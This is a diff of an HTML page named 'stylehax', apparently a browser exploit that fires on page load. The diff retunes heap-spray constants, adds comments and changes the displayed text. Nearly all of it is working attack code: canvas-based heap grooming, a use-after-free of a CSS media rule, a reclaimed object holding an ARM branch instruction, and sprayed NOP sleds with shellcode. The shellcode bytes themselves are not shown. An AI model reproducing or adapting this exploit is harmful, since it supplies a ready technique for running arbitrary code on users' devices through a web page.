@@ -1,3 +1,6 @@
+<!-- stylehax by nathan 2023 -->
+<!-- https://github.com/nathanfarlow/stylehax -->
+
 <html>
 
 <head>
@@ -15,10 +18,10 @@
 
       function exploit() {
          var canvases = [];
-         var N = 0x900 / 2;
-         var obj_size = 0x28 * 2;
+         var N = 0x480;
+         var obj_size = 0x50;
 
-         // create a bunch of canvases
+         // create a bunch of canvases for heap magic
          for (var i = 0; i <= N; i++) {
             var a = document.createElement("canvas");
             a.width = obj_size / 4;
@@ -30,6 +33,7 @@
          var styleSheet = document.getElementById('style1').sheet;
          var mediaRule = styleSheet.cssRules[0];
 
+         // heap magic
          var arr = new Array();
          for (var i = 0; i <= N; i++) {
             c = canvases[i].getContext("2d");
@@ -51,11 +55,12 @@
          mediaRule.deleteRule(0);
 
          // try to reclaim memory of freed object with jump shellcode
+         // (more heap magic)
          var arr = new Array();
          for (var i = 0; i <= N; i++) {
             canvases[i].width = canvases[i].width;
             c = canvases[i].getContext("2d");
-            // FE FF 13 EA -- b #0x500000
+            // FE FF 13 EA -- b #0x500000 -- bootstrap: jumps to nop sled
             c.fillStyle = "rgba(254, 255, 19, 0.918)"
             c.fillRect(0, 0, obj_size / 4, 1);
             arr[i] = c.getImageData(0, 0, obj_size / 4, 1).data[0];
@@ -66,11 +71,13 @@
             nops += nops;
          }
 
+         // spray nopsleds and shellcode
          var a = new Array();
          for (var i = 0; i < 0x40; i++) {
             a[i] = nops + shellcode;
          }
 
+         // accessing this property causes jump to bootstrap
          mediaRule.cssRules.length;
          alert("exploit failed. reboot and try again")
       }
@@ -78,9 +85,10 @@
 </head>
 
 <body onload="exploit()">
-   <p>close the popup when it appears.</p>
-   <p>othwerise, don't touch anything.</p>
-   <p>if waited > 30 seconds, reboot and try again.</p>
+   <div style="width: 250px">
+      <p>stylehax by nathan</p>
+      <p>exploit in progress :)</p>
+   </div>
 </body>
 
 </html>
